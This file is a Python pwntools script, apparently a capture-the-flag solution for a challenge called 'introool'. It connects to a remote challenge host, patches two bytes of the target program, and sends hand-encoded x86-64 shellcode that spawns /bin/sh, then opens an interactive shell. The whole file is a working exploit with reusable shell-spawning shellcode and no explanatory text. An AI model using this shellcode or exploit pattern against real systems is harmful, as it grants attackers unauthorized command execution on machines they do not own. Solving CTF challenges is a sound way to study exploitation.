from __future__ import division, print_function
import random
from pwn import *
import argparse
import time


context.log_level = 'error'

parser = argparse.ArgumentParser()
parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="target host"
        )
parser.add_argument(
        "--port",
        default=3001,
        help="target port"
        )
parser.add_argument(
        '--log',
        action='store_true'
        )
parser.add_argument(
        '--is-gaibu',
        action='store_true'
        )
args = parser.parse_args()


log = args.log
is_gaibu = args.is_gaibu
host = "introool.challenges.ooo"
port = 4242

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, '\x00'), endian='big')

r = remote(host, port)

def recvuntil(x, verbose=True):
    s = r.recvuntil(x)
    if log and verbose:
        print(s)
    return s.strip(x)

def recv(verbose=True):
    s = r.recv()
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip('\n')

def sendline(s, verbose=True):
    if log and verbose:
        pass
        #print(s)
    r.sendline(s)

def send(s, verbose=True):
    if log and verbose:
        print(s, end='')
    r.send(s)

def interactive():
    r.interactive()

####################################

def menu(choice):
    recvuntil(':')
    sendline(str(choice))

# receive and send
def rs(r, s, new_line=True):
    recvuntil(r)
    if new_line:
        sendline(s)
    else:
        send(s)



s = '\x48\xBB\x2f\x62\x69\x6E\x2F\x73\x68\x00\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

x = hex(u64(s[:8], endian='big'))[2:].rjust(16, '0')
y = hex(u64(s[8:16], endian='big'))[2:].rjust(16, '0')
z = hex(just_u64(s[16:]))[2:].rjust(16, '0')

print(x, y, z)

recvuntil('> ')
sendline('90')
recvuntil('> ')
sendline('230')

recvuntil(':')
sendline('22e')
recvuntil(':')
sendline('eb')

recvuntil(':')
sendline('22f')
recvuntil(':')
sendline('44')

recvuntil(' > ')
sendline(x)
recvuntil(' > ')
sendline(y)
recvuntil(' > ')
sendline(z)


interactive()


